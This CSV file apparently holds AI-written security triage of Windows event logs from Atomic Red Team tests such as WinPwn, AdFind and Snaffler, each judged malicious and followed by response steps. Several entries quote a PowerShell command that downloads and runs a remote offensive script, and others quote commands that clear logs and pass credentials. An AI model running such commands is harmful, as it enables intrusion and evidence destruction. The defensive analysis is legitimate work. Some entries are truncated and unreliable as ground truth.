Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"Upon reviewing the provided Windows event logs, several actions and sequences are notable and warrant a closer examination for potential security incidents:

1. **PowerShell Execution:** 
   - The PowerShell logs indicate that a PowerShell command was executed to retrieve the default domain password policy using `get-addefaultdomainpasswordpolicy`. While retrieving domain password policies can be a legitimate administrative task, frequent or unexpected access by users not typically engaged in such tasks can indicate reconnaissance activity by an intruder.

2. **Event Clearing:** 
   - In the System, Sysmon, and Security logs, `wevtutil.exe` was used to clear the event logs (`System`, `Security`, and `Windows PowerShell`). The execution of `wevtutil.exe cl` (clear logs) by the user `admin_test` is suspicious. Log clearing can be a strong indicator of malicious activity attempting to cover tracks.

3. **System Logs Time Manipulation:**
   - There are logs indicating changes to the system time, which is an unusual activity unless caused by a legitimate maintenance or synchronization issue. Changing the system time can be used to bypass security controls or auditor timestamps, suggesting potentially malicious intent.

4. **Use of Administrative Account:**
   - The activities are performed under the `admin_test` account, which aligns with a potentially compromised administrative account being used to execute disruptive and unauthorized tasks.

5. **Frequent System Utilities Usage:**
   - The usage of utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` in close sequence could indicate a reconnaissance phase where an attacker is gathering information about the environment.

**Assessment:**
- The combination of these actions, especially the clearing of multiple critical event logs, without specific benign explanations or precedent in normal operations, strongly suggests malicious behavior aimed at evasion and covering up unauthorized actions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected system to prevent further compromise or lateral movement.
   - Conduct a full investigation to determine the source of access and ascertain the depth of the compromise.
   - Initiate password changes for the `admin_test` account and potentially other accounts if credentials are suspected to be compromised.

2. **Further Investigation:**
   - Verify if there were any recent successful unauthorized logins or privilege escalations.
   - Check other systems in the network for similar log-clearing activities or unusual access patterns.
   
3. **Remediation and Monitoring:**
   - Reinforce security measures, including the review of privileged account activities and access controls.
   - Implement advanced logging and monitoring for early detection of similar suspicious activities in the future.

4. **Review and Improve Security Policies:**
   - Strengthen policies surrounding the use of PowerShell and administrative utilities.
   - Educate users on potential phishing attempts and the importance of account security. 

These steps will help in minimizing further risks and ensuring a secure and controlled IT environment."
WinPwn - generaldomaininfo,"Based on the provided Windows event logs, I will perform a detailed analysis to identify any suspicious or anomalous behavior indicating potential malicious activity:

### Analysis:

1. **Log Clearing Activity:**
   - **Security log EventID 1102 & System log EventID 104**: The logs indicate that the event logs on ""Server002"" were cleared. This activity is associated with the ""admin_test"" user. Log clearing can be a normal administrative activity, but when associated with other suspicious behaviors, it can indicate an attempt to cover tracks after unauthorized actions.

2. **Unauthorized PowerShell Activity:**
   - **PowerShell log EventID 600 & Sysmon log EventID 1**: There is a noteworthy PowerShell command executed: 
     - `powershell.exe & { $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); generaldomaininfo -noninteractive -consoleoutput }`
   - This command line execution indicates the download and execution of a remote script from GitHub, specifically from the user repository ""S3cur3Th1sSh1t"". Such behavior is highly suspicious as it could indicate the download and execution of potentially malicious scripts.

3. **Execution of Diagnostic Tools:**
   - **Sysmon log EventIDs as with `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe`**: These events show the execution of tools that could be used for system reconnaissance. While these can be typical administrative actions, their presence around the same time of the logs being cleared could indicate a reconnaissance phase of a potential attack.

4. **Time Synchronization Manipulation:**
   - **Security log EventID 4616 & System log EventID 1 and 24**: The presence of time synchronization changes in close proximity to the log clearing might suggest an attempt to manipulate timestamps as additional obfuscation.

5. **Microsoft Edge Update Activity:**
   - **Sysmon log**: Numerous entries indicate activities related to Microsoft Edge Update processes. These can generally be routine unless they notably diverge from standard activity patterns. However, without more specific context or external signs of compromise in the EdgeUpdate.exe process chain, they appear benign in this instance.

### Conclusion and Resolution:

Given the analysis, significant indicators of suspicious behavior are present. The combination of PowerShell activity, particularly the downloading and execution of scripts from a potentially risky source, alongside log clearing actions, raises strong concerns:

- **Resolution: MALICIOUS**

### Threats and Risks:

1. **Threat Actor Activity**: The execution of externally sourced PowerShell scripts suggests the possibility of unauthorized access or data exfiltration.
2. **Evasion Techniques**: Clearing of logs suggests attempts to cover tracks after unauthorized actions.
3. **Potential Reconnaissance**: Execution of diagnostic tools may indicate enumeration activity in preparation for further attacks.

### Guidance on How to Proceed:

1. **Immediate Response**:
   - Isolate the affected system to prevent further potential lateral movement.
   - Conduct a full forensic investigation to examine the impact and scope of the compromise.
   - Inspect for any additional unauthorized persistence mechanisms or tools deployed by the threat actor.

2. **Security Enhancements**:
   - Strengthen monitoring of PowerShell usage with enhanced logging (e.g., transcription logging).
   - Implement stricter controls and auditing for log-clearing operations.
   - Consider applying network monitoring to identify unusual data flows or further attempts to access external resources.
   
3. **User Account Review**:
   - Conduct a review of the ""admin_test"" user activities to ensure that the credentials and actions are legitimate.
   - Reset passwords and enforce multi-factor authentication where possible."
ESXi - VM Discovery using ESXCLI,"Upon reviewing the provided logs, certain events and patterns stand out that could indicate suspicious or potentially malicious activity. Let's break down the findings:

### Suspicious Behavior Observed:

1. **Clearing of Event Logs:**
   - Multiple instances of the `wevtutil.exe` command being used to clear logs (`Sysmon`, `System`, `Security`, and `PowerShell` logs) on `2024-10-23` were noted. This was executed by the user `SERVER002\admin_test`. These actions can be indicative of an attempt to cover tracks after potential malicious activities.

2. **Process Execution with High Privileges:**
   - The `admin_test` account executes `wevtutil.exe` with high integrity level, which suggests high-level permissions were used. Clearing logs with such privilege is unusually aggressive for routine operations.
   - Privileges such as `SeDebugPrivilege` and others were detected in `4672` events, indicating potential privilege escalation.

3. **Suspicious Command-Line Arguments:**
   - Sysmon logs show a command involving `pl`ink.exe` executed via `cmd.exe` that seems to connect to a remote machine `atomic.local` using SSH with credentials (`-l ""root"" -pw ""pass""`). The use of such commands in the sequence could imply remote access or data exfiltration attempts.

4. **Execution of External Payloads:**
   - The execution path suggests the involvement of Atomic Red Team (`T1082` path in the payloads executed), which is typically used for security simulation or testing. While this may be benign in a controlled environment, unauthorized use or timing concurrent with log clearing raises concerns.

5. **Concurrent Background Noise:**
   - Several background processes related to system updates or maintenance were running (`MicrosoftEdgeUpdate.exe`, `MusNotification.exe`, etc.), which are generally legitimate. However, in the presence of the aforementioned suspicious activities, they could serve as a cover to avoid detection.

### Threat Assessment and Risk:

- **Log Clearing**: This is a significant red flag, indicating efforts to obscure malicious activity. The consistent pattern of events seems deliberate rather than accidental.
- **SSH Session Attempts with Possible Malicious Intent**: The specified use of `plink.exe` in the context and script files might indicate an attempt to initiate a remote session with a potentially unauthorized intent.
- **Use of Admin Privileges to Obscure Activities**: The pattern indicates possible privilege abuse or compromise, showing a clear deviation from standard user behavior.

### Resolution:

Based on the analysis:
- **Resolution**: **MALICIOUS** 

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate the affected system (`Server002`) from the network to prevent further potential malicious activities.
   - Conduct a full forensic analysis to recover any cleared logs, if possible, and analyze any potential malware or scripts involved.

2. **Audit Privileged Accounts:**
   - Review the usage and access logs of the `admin_test` account and other privileged accounts for further suspicious logins or commands.
   - Reset credentials of potentially compromised accounts.

3. **Monitor Network Activity:**
   - Track any outbound connections that might have occurred around the time suspicious commands were executed.
   - Set up increased monitoring on any similar assets.

4. **Assess Security Practices:**
   - Ensure that logging cannot be cleared without generating alerts.
   - Review the use of scripting tools and remote access utilities within the environment to ensure they are properly authorized and monitored.

Through these steps, you can contain the threat and prevent future incidents of a similar nature."
WinPwn - printercheck,"Based on the provided Windows event logs, several key aspects stand out which suggest potentially malicious activity on the Windows host, particularly involving the use of PowerShell and the clearing of event logs. Here is a detailed analysis:

1. **Suspicious PowerShell Activity:**
   - The Sysmon log entries show the execution of `powershell.exe` with a command that downloads and executes a script from a GitHub repository (URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This script seems to be executed in a non-interactive and non-displaying manner, indicating stealthy behavior.
   - The associated Windows PowerShell logs confirm this execution, highlighting the usage of `iex(new-object net.webclient).downloadstring(...)`, a common technique used in malicious scripts to execute code directly from online sources.
   - Such behavior aligns with known indicators of compromise where attackers use PowerShell to download and execute malicious payloads.

2. **Event Log Clearing:**
   - The security logs indicate that the event log was cleared by a user named `admin_test`. This action is reflected in multiple logs across the Security, System, and possibly other event logs.
   - Clearing event logs is a known tactic used by attackers to hide traces of their malicious activities. The process `wevtutil.exe` is commonly used for this purpose.

3. **Integrity Level and User Context:**
   - The suspicious processes are executed with a high integrity level under the user `SERVER002\\admin_test`, suggesting that the attacker may have administrative privileges on the system which is potentially used to clear logs and execute potentially harmful scripts.

4. **Temporal Correlation:**
   - The series of events involving PowerShell execution and event log clearing occur in quick succession, which is often indicative of an attacker's attempt to execute malicious actions quietly and without leaving traces.

5. **Host-based Security Alerts:**
   - The initial alert was generated from the CEO's machine, implying that actions taken on these logs may closely affect sensitive user accounts and data, heightening the risk and potential impact.

### Assessment and Resolution:
The analysis of these logs strongly indicates malicious activity. The presence of PowerShell scripts being executed from non-official sources combined with the clearing of event logs is a critical indicator of compromise.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Actions:**
  - Isolate the affected host (Server002) from the network to prevent further spread or data exfiltration.
  - Conduct a comprehensive malware scan and forensic analysis on the system.
  - Change credentials for any affected users, especially those in administrative roles.
  - Restore data and logs from backup if possible.

- **Further Investigation:**
  - Analyze network logs to determine if any data was exfiltrated.
  - Review permissions and access controls to identify how administrative privileges were obtained.
  - Evaluate the source and script on GitHub to understand the full extent of the script's intent and actions.

- **Long-term Actions:**
  - Implement strict PowerShell script execution policies and monitoring.
  - Enhance logging and monitoring capabilities to detect similar activities promptly.
  - Train IT staff and users to recognize and report suspicious behaviors quickly.

This coordinated approach ensures prompt containment, comprehensive understanding, and strong prevention against future incidents."
Security Software Discovery - AV Discovery via WMI,"Upon reviewing the provided logs, several points raise concerns indicating potential malicious activity:

1. **Event Log Clearing Activity:**
   - The logs show multiple instances of the `wevtutil.exe` utility being used to clear various event logs (Security, System, Windows PowerShell). 
   - Event ID 1102 in the Security log indicates the security event logs were cleared. This activity was performed by the user ""admin_test"" who is operating with high integrity level privileges.
   - A common tactic for attackers is to clear logs to cover their tracks after executing malicious actions.

2. **Command Line and Process Activity:**
   - There is extensive use of `wevtutil.exe`, which is not typical for regular users or even administrators in routine operations. This tool is generally used to manage Windows event logs.
   - The `COMMANDLINE` shown for `wevtutil.exe` (e.g., `cl Security`) explicitly indicates clearing of logs, consistent with obfuscation efforts by a malicious actor.
   
3. **Process Execution and User Context:**
   - All suspicious activities were carried out by the user ""admin_test"" and involve elevated privilege contexts (High Integrity Level), suggesting the potential use of privileged credentials.
   - There are command executions, such as the use of `cmd.exe` to execute Windows Management Instrumentation Command-line (`wmic.exe`) to gather information on antivirus products. This is indicative of reconnaissance activity often performed by adversaries to understand the security posture of a compromised system.

4. **Time Change:**
   - Multiple entries show adjustments to the system time via `svchost.exe`. This might be an effort to break sequence or mislead logging systems, though it is lesser a direct indicator compared to log clearing.

Given these activities, especially the manipulation of logs using `wevtutil.exe`, clearing of security logs, and potentially reconnaissance activities using `wmic`, the logs reveal patterns strongly indicative of malicious behavior. These activities conform to typical TTPs (Tactics, Techniques, and Procedures) associated with attackers trying to maintain persistence, escalate privileges, or conduct activities without detection.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Response:**
  - Isolate the host (Server002) to prevent further unauthorized access or potential spread within the network.
  - Begin a detailed forensic investigation into the activity of user ""admin_test"" to determine the source of credential compromise or abuse.
  - Review and analyze the event logs that led up to the clearing activity, if backups or alternative log sources exist.
  
- **Remediation Actions:**
  - Conduct a comprehensive vulnerability assessment to identify potential security gaps that allowed the compromise.
  - Reset credentials and enforce stricter access controls, particularly focusing on privilege usage and multi-factor authentication.
  
- **Future Mitigation:**
  - Enhance monitoring and alerting for event log management activities like `wevtutil.exe` usage.
  - Incorporate anomaly detection mechanisms within the EDR (Endpoint Detection and Response) solutions for actions related to log file manipulation and system time changes. 
  - Educate privileged users about cybersecurity hygiene and regularly review privilege assignments."
File and Directory Discovery (cmd.exe),"After analyzing the provided Windows event logs, I have identified several activities that warrant closer scrutiny. The key observations and areas of concern are as follows:

1. **Repeated Log File Clearing Events:**
   - Multiple instances of log file clearing events are recorded in the `System`, `Windows PowerShell`, and `Security` logs. Specifically, Event ID 104 in the `System` log and Event ID 1102 in the `Security` log indicate that logs were cleared by the user `admin_test` on `Server002`.
   - Log file clearing can often be associated with attempts to cover malicious activities or unauthorized actions.

2. **Suspicious Command Line Activity:**
   - The command line activity involving `wevtutil` (Eventing Command Line Utility) and `cmd.exe` with commands that involve directory listing and writing outputs to temporary files (`T1083Test1.txt`) appears suspicious. This particular usage can be indicative of data collection or enumeration often associated with scripts run during security assessments or malicious reconnaissance.

3. **Execution of System Utilities:**
   - System utilities such as `whoami.exe`, `hostname.exe`, `taskhostw.exe`, and others were executed, possibly under high integrity levels. While these may be part of normal operations, their frequent and clustered invocation could imply script execution or automation.
   
4. **Changes to System Time:**
   - There are events indicating changes to system time. Event ID 4616 from the `Security` log suggests alterations to system time settings, which can be used to manipulate timestamps or bypass security measures based on time/log analysis.

5. **Additional Elevated Privileges and Logons:**
   - Several `4624` and `4672` logon events indicate system-level privileges being assigned, which may be regular but require confirmation of legitimacy under the context of heightened activity.
   
6. **Execution of `wevtutil` for Various Logs:**
   - The `wevtutil.exe` was used to clear multiple logs (`System`, `Application`, and `Security`), which typically indicates an intention to hide tracks.

In aggregate, these activities suggest potential malicious behavior that is worth investigating further. The combination of log clearing, suspicious command execution, and manipulation of system-level functions points to possible compromise or at the very least a breach attempt and reconnaissance activity.

**Assessment:** 
Resolution is deemed **MALICIOUS** due to the unmistakable actions of log clearing alongside suspicious enumerative command executions, which are indicative of malicious intent to evade detection.

**Guidance:**
- Initiate a full forensic investigation on `Server002` to understand the scope and intent of the breach.
- Review all relevant security controls and update system configurations to prevent further unauthorized activities.
- Consider isolating the affected systems until they are verified to be secure.
- Monitor network traffic for unusual patterns indicative of data exfiltration or external command-and-control communication.
- Resume immediate password changes for sensitive accounts, especially for the user `admin_test`.
- Ensure all logs are intact and monitored regularly to prevent unauthorized clearing activities in the future."
System Time Discovery W32tm as a Delay,"Upon reviewing the provided event logs for the Windows host ""Server002,"" several indications suggest potentially malicious activity or actions that may warrant further investigation. Here are the key findings and their implications:

### Suspicious or Anomalous Behaviors
1. **Event Log Clearing:**
   - *Security Log Event ID 1102 & System Log EventID 104*: These events indicate that the security and system logs have been cleared by the user 'admin_test'. Log clearance is a known tactic to eliminate traces of malicious activity. The specific calls to `wevtutil.exe` with parameters to clear various logs amplify this concern.

2. **Process Execution with High Integrity Level:**
   - Multiple instances of `wevtutil.exe` tasks are observed (Sysmon Log EventID 1 with Image Path `C:\Windows\System32\wevtutil.exe`) running with high integrity. These processes are used to clear Windows logs.

3. **Repetitive Execution of System Utilities:**
   - Execution of utilities such as `whoami.exe`, `hostname.exe`, and `w32tm.exe` suggests system enumeration activities. While these might occur in regular intervals for legitimate administrative tasks, their concurrent timestamps along with log clearing is suspicious.

4. **Unexpected Use of Command-Line Tools:**
   - The presence of command line executions for `whoami` and `cmd.exe` with parameters uncommon for administrative tasks. The manipulation of time using `w32tm` might suggest attempts at time alteration.

5. **Multiple Instances of Svchost.exe:**
   - There's a notable invocation of time changes by `svchost.exe`, which further coincides with rapid and multiple time changes logged (EventID 4616). While sometimes necessary for service alignment, it can also indicate potential stealth techniques.

### Assessment
Given the above indicators, the events are consistent with behaviors associated with attempts to:
- Conceal unauthorized access by clearing logs.
- Enumerate system information potentially for lateral movement.
- Utilize native tools for malicious operations under high privileges.

### Recommendation:
Terminate any unnecessary or potentially malicious processes immediately. It's crucial to conduct a deeper investigation by:
- Isolating the host if possible to prevent further infiltration or data exfiltration.
- Assessing the integrity of the host for potential compromise.
- Reviewing any external connections that might correlate with unauthorized access attempts.

For added assurance, (re)view network logs for external connections from this host in tandem with the timeline of suspicious activities.

### Resolution
**MALICIOUS** - Based on the clear intent to hide activity via log clearing, coupled with system enumeration signs, these logs indeed contain strong indicators of compromise.

Implement necessary incident response measures immediately."
Adfind - Query Active Directory Groups,"Upon reviewing the provided Windows event logs, a number of events indicate potentially suspicious actions on the host. Below is a detailed analysis based on the contents of the logs:

### Key Observations:

1. **Security Log Clearance (Event ID: 1102):**
   - The event log shows that the security logs were cleared by a user with the name `admin_test` (SID: S-1-5-21-3962163828-2803415714-1403596700-1006). 
   - This action can be linked to an attempt to cover tracks, which is a behavior often associated with malicious activity.

2. **Process Creation and Use of `wevtutil` (Sysmon Event IDs: 1):**
   - There are several instances of the command line utility `wevtutil.exe` being executed with the argument `cl`, indicating that someone cleared multiple event logs, including the Sysmon, Application, and Security channels.
   - The clearing of these channels by `admin_test` further suggests an intention to delete forensic evidence.

3. **Use of Potentially Malicious Tools:**
   - The execution of `cmd.exe` with the command involving `AdFind.exe`, a tool known to be used for gathering information from Active Directory, potentially indicates reconnaissance activity or information gathering.

4. **Audit Privileges (Event ID: 4672):**
   - Privileges assigned to the SYSTEM account include powerful rights such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, and others which, while normal for system processes, require careful monitoring if associated with other suspicious activities.

5. **Executions of System Utilities (Sysmon Event IDs):**
   - Tools such as `HOSTNAME.EXE` and `WHOAMI.EXE` were executed. While these actions alone are not inherently malicious, they can be indicative of an attacker trying to gather basic system information.

### Assessment:

- The combination of log clearing, use of `wevtutil` to delete specific logs, and the execution of reconnaissance tools (`AdFind.exe`) are notable red flags of a compromise.
- These actions suggest that an actor is attempting to maintain persistence, escalate privileges, or prepare for further attacks while avoiding detection.

### Recommended Actions:

1. **Resolution: ** MALICIOUS

2. **Immediate Steps:**
   - Isolate the affected machine, `Server002`, from the network to prevent further potential spread or data exfiltration.
   - Conduct a full forensic investigation to understand the extent of the compromise, focusing on any unauthorized access and data integrity, especially given this is the CEO's machine.

By following these recommendations, your organization can address the immediate threat posed by this incident and improve resilience against future attacks."
Hostname Discovery (Windows),"Upon examining the provided logs, several suspicious activities can be observed:

### Suspicious Activities Detected:

1. **Event Log Clearing:**
   - Multiple instances where event logs, including Sysmon, Application, System, and PowerShell logs, were cleared using `wevtutil.exe`. This activity is commonly used by attackers to cover their tracks post-exploitation.
   - Specifically, events `EventID 104` in the System log and `EventID 1102` in the Security log indicate that logs were cleared.

2. **Execution of `wevtutil.exe`:**
   - Seen in several Sysmon logs, `wevtutil.exe` was executed with the command line parameters to clear logs. This tool can be legitimately used by administrators but in combination with the timing and the sequence of events, it suggests an attempt to hide actions.

3. **Time Manipulation:**
   - Events `EventID 24` and `EventID 1` suggest time changes on the system. Time changes can be a tactic used in attacks to disrupt logs and timestamps, making it harder to trace activities accurately.

4. **High-Integrity User Actions:**
   - All activities were conducted under the `SERVER002\admin_test` user with high integrity level privileges. The user also holds several elevated privileges, including SeDebugPrivilege and SeTakeOwnershipPrivilege, indicative of a highly privileged account, which, if compromised, can lead to severe security breaches.

5. **Presence of Elevated Privileges:**
   - The logons for the `admin_test` user included privileges such as SeDebugPrivilege, indicating this account had extensive rights on the system, which, if misused or compromised, could lead to unauthorized access and changes.

6. **Network-Based Logons:**
   - The `admin_test` account was logged in using NTLM authentication, which suggests either remote access or authentication over the network was used. The presence of two logons (recorded a few milliseconds apart) from possibly different IPs could indicate potential unauthorized access or attempts.

### Assessment and Recommendations:

- **Resolution: MALICIOUS**
  - The clearing of logs, combined with the execution of administrative level command-line utilities like `wevtutil.exe` and observed time modifications, strongly indicates an attempt to obfuscate malicious activities on the host system.
  - It’s recommended to immediately isolate the affected system (Server002) to prevent further potential access or exfiltration of data.
  - A full forensic investigation should be conducted on the machine to uncover the root cause and entry points of the breach.
  - Reset credentials for sensitive accounts, particularly the `admin_test` account, and review permissions and access given to prevent future breaches. Implement strict monitoring and alerting on log clearance actions and privilege escalation attempts.
  - There may be a need to audit other systems on the network that may have had similar unauthorized access, for any lateral movement.

This activity scan points to potential malicious intent, emphasizing a need for a prompt and thorough response."
Reg query for AlwaysInstallElevated status,"Upon analyzing the provided logs, several points stand out regarding potentially malicious activity:

1. **Log Cleared Events:**
   - Several logs across different channels such as System, Security, and Windows PowerShell have been cleared around the same time (08:34:55 UTC). This is indicated by EventID 104 in the System log, EventID 1102 in the Security log, and corresponding Sysmon events showing `wevtutil.exe` usage for clearing logs. This is a significant red flag, as attackers often clear logs to cover their tracks.

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` command-line utility was used to clear logs. It appears in the Sysmon events multiple times with different command lines, including clearing logs from the System, Security, and Windows PowerShell channels. The command usage and timing align with the log clearance events, contributing to suspicion since they were all executed by the same user, `SERVER002\\admin_test`, maintaining a high integrity level.

3. **Command Prompt Activity:**
   - There is a suspicious usage of `cmd.exe` involving potential privilege escalation checks using registry queries (`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`). The `AlwaysInstallElevated` policy, if enabled, can allow non-admin users to run MSI files with elevated privileges, indicative of privilege escalation attempts.

4. **Credential Attempts:**
   - Security logs with EventID 5379 present failed logon and credential extraction attempts for a Microsoft account (`02txoixylodcstop`). The return codes indicate failure (`3221226021`), but repeated attempts within a short time frame could suggest unauthorized access attempts.

5. **User and System Activity:**
   - Observed processes like `whoami.exe` and `hostname.exe`, while benign in isolation, when aggregated with the context of other suspicious activities, can be indicative of enumeration occurring post-compromise.

6. **Windows Update and Antivirus:**
   - Regular updates for Windows Defender Antivirus (EventIDs 43, 44, 19 in the System Log) are noted which seem to be usual operations but do not align with the critical suspicious activities highlighted above.

**Assessment:** The convergence of multiple logs being cleared by `wevtutil.exe`, suspicious command-line activities to escalate privileges, combined with unusual account access attempts, strongly suggest potential malicious activity.

**Recommendation:** Immediate further investigation is necessary. Actions should include:
- Examination of the `admin_test` account for unauthorized access or misuse.
- A thorough review of network logs and any system changes surrounding the log clearance event.
- Enhancement of monitoring to capture and alert such activities.
- Potentially isolating the system to prevent lateral movement while the investigation continues.

**Resolution:** **MALICIOUS** - The logs contain a combination of log clearance, suspicious command-line execution, and potential unauthorized access attempts which are indicative of malicious activity."
Enumerate all accounts on Windows (Local),"### Analysis of Logs:

   - **System log cleared**: Event ID `104` indicates that the system log was cleared under the `System` channel by `admin_test`.
   - **Windows PowerShell log cleared**: Event ID `104` in the System log shows that the Windows PowerShell log was cleared by `admin_test`.

2. **Cmd.exe Execution**:
   - Several `cmd.exe` processes were started with commands like `net user`, `dir c:\Users\`, `cmdkey.exe /list`, which could indicate a system enumeration or an attempt to extract credentials and list user accounts or executed by `admin_test`.

3. **cmdkey.exe Usage**:
   - Usage of `cmdkey.exe` to list stored credentials is often used for enumeration purposes or credential theft.

4. **Time Modification**:
   - Event ID `4616` suggests that the system time was changed twice in quick succession by a process (`svchost.exe`). While this could be normal system behavior, combined with log clearing, it might be used to cover tracks.

5. **Unusual Process Executions and Parent-Child Relationships**:
   - A series of wevtutil.exe commands were executed to clear logs under different channels (Microsoft-Windows-Sysmon/Operational, Application, System, Security).

6. **Suspicious User `admin_test` Heuristic**:
   - Most of the processes and activities were initiated by `admin_test`, which involved clearing logs and potentially malicious commands execution.

#### Assessment:

The logs show a clear sequence of log clearing across multiple channels, combined with potentially malicious command line activities like user enumeration and credential listing. The clearing of event logs such as Security and System is a significant indicator of an attempt to cover tracks after or during malicious activity.

### Final Assessment: **MALICIOUS**

- **Threats/Risks**:
  - Unauthorized log clearing can erase forensic artifacts.
  - User and credential enumeration could lead to privilege escalation or lateral movement.
  - The attempt to cover tracks by clearing logs signifies malicious intent.

### Guidance on How to Proceed:
1. **Isolate the Affected System**: Immediately isolate `Server002` from the network to prevent any further potential malicious activity.
2. **Detailed Forensic Investigation**:

Adfind - Enumerate Active Directory Computer Objects,"### Detailed Analysis of the Logs

Upon reviewing the provided Windows event logs, the following points of concern have been identified:

1. **Log Clearing Events:**
   - **Event ID 1102** in the Security log indicates that the audit log was cleared by a user (`admin_test`). This is particularly suspicious as clearing event logs can be a technique used by malicious actors to cover their tracks.

2. **Process Execution and Command-Line Arguments:**
   - Multiple events show the use of `wevtutil.exe` to clear logs, including channels such as Microsoft-Windows-Sysmon/Operational, Security, System, and Windows PowerShell (`Event IDs 1` in the Sysmon logs). The use of `wevtutil` with the `cl` (clear log) command under the user `admin_test` is significant and suspicious, as it suggests an intentional hiding of activities.
   - The execution of `cmd.exe` with a command pointing to `AdFind.exe` (`Event ID 1` in Sysmon logs) seems to indicate the use of a known tool for enumeration, which can be a red flag for adversary activities.

3. **Unusual Privilege Use:**
   - **Event IDs 4624 and 4672** indicate an account logged in with a high number of privileges (like SeDebugPrivilege, SeRemoteShutdownPrivilege, etc.), which are typically required for elevated activities and can be leveraged for malicious purposes.

4. **Security Intelligence Updates:**
   - Windows Update events for security intelligence updates for Microsoft Defender Antivirus are routine but suggest active updates are being applied.

5. **Behavior of Potential Malicious Tools:**
   - The presence of `AdFind.exe` is concerning. This tool is often used for reconnaissance within Active Directory environments and can be part of a larger attack strategy.

### Assessment

Given the prevalence of log clearing (an indicator of malicious intent) and the presence of suspicious tools and command-line executions (particularly `AdFind.exe` and `wevtutil.exe` to clear logs), there are strong indicators of potentially malicious activity.

### Threats or Risks Identified

- The clearing of logs combined with the execution of known enumeration tools suggests the system may be compromised and being prepared or already used for more malicious actions.
- The use of high privilege accounts to execute suspicious activities suggests that the attacker possibly has elevated access which could lead to further system or network compromise.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent potential lateral movement.
   - Preserve all currently available logs and system state for forensic analysis.

2. **Forensic Investigation:**
   - Retrieve backups or snapshots of logs prior to clearing, if available, for further review.
   - Conduct a deep analysis of all processes and network connections to identify other signs of compromise.

3. **Review Account Activity:**
   - Review the account `admin_test` and any other accounts with elevated privileges to confirm their legitimacy and activity.
   - Reset credentials for potentially compromised accounts and review current access policies.

4. **Strengthen Monitoring:**
   - Implement stricter monitoring for similar suspicious activities across the network.
   - Consider deploying more advanced threat detection tools or services to identify such activities in the future.

### Resolution

- **MALICIOUS** - The combination of log clearing activities, the presence of enumeration tools, and execution of these under high privilege accounts indicates a high likelihood of system compromise with malicious intent. Immediate action is required to mitigate further risk and determine the full extent of the breach."
Enumerate All Network Shares with Snaffler,"Upon analysis of the provided event logs, there are several points of interest that indicate potentially suspicious or malicious activity, primarily revolving around the usage of PowerShell and process injections.

1. **PowerShell Activity**:
   - The PowerShell logs indicate that there was a sequence of commands executed via PowerShell involving the use of `Invoke-Expression` to run a suspicious file, `Snaffler.exe`, located in a temporary directory path. The use of PowerShell with encoded commands (evident from the encoded command in the logs) and subsequent launching of other processes is a technique often used to obfuscate the true intention of the script and is a hallmark of malicious scripts.
   - The `Invoke-Expression` usage along with the encoded command suggests an attempt to hide activities from being easily understandable, increasing the likelihood of malicious intent.

2. **Sysmon Events**:
   - The Sysmon logs confirm that PowerShell was invoked with suspicious command lines, and there's a reference to `cmd.exe` being used for further operations. The `Snaffler.exe` is executed via cmd with arguments, which is unusual for a benign activity.
   - Additionally, there is a record of logs being cleared (EventID 1102 in Security log and EventID 104 in System log), indicating a potential attempt to cover tracks. Log clearing by `admin_test` without a recorded authorized maintenance window or explanation is typically suspicious.

3. **Unauthorized Privilege Use**:
   - There are multiple entries in the Security logs for privilege use by the user `admin_test` that include high-impact privileges like `SeDebugPrivilege`. These entries coincide with the timing of the PowerShell activities, suggesting possible privilege escalation or improper use of high-level privileges without legitimate reasoning.

4. **Indicators of Code Execution and Persistence**:
   - The execution details of processes seem coordinated, using different processes like `cmd.exe`, `conhost.exe`, and leveraging encoded PowerShell commands, which is a common tactic to maintain persistence or conduct unauthorized operations without being detected.

5. **Summary of Potential Malicious Behavior**:
   - Execution of potentially unwanted software (PUP), `Snaffler.exe`, typically associated with network discovery and reconnaissance.
   - Obfuscation through encoded PowerShell commands.
   - Log deletion activities that might imply an effort to erase tracks or evidence of execution.
   - Unauthorized and unexplained privileges being assigned and used by a non-standard user account (`admin_test`).

6. **Resolution**:
   - **MALICIOUS**: The activities highlighted above provide strong indicators of malicious intent, consistent with tactics, techniques, and procedures (TTPs) commonly associated with malware or an attacker’s lateral movement and data discovery efforts within a network environment. It's essential to immediately isolate the affected system, conduct a thorough forensic analysis, review all user accounts and privileges, and check the network for further signs of compromise.

**Guidance on How to Proceed**:
- Implement immediate containment measures to prevent any potential spread of malicious activity.
- Conduct a thorough review of the compromised account activities, validate the authenticity of the account ownership, and if necessary, revoke credentials.
- Analyze network traffic originating from this host to verify if there was any exfiltration attempt.
- Restore systems from a known good state backup after ensuring all threats are neutralized.
- Enhance monitoring and activate advanced threat detection mechanisms across the environment to detect similar activities in the future."
Enumerate Active Directory Computers with ADSISearcher,"Upon analyzing the provided Windows event logs, we can identify a sequence of events that may raise concerns regarding potential malicious activity:

### Suspicious or Anomalous Events:
1. **Clearing of Event Logs**:
   - The `wevtutil` command is used to clear multiple event logs, including the `Security`, `System`, and `Windows PowerShell` logs. This is a typical indication of an attempt to cover tracks usually linked to malicious activities:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl System`
     - `wevtutil.exe cl Security`
     - `wevtutil.exe cl ""Windows PowerShell""`  
   - The Security log entry (EventID 1102) confirms that the security audit logs were cleared by the user `admin_test`.

2. **Suspicious PowerShell Commands**:
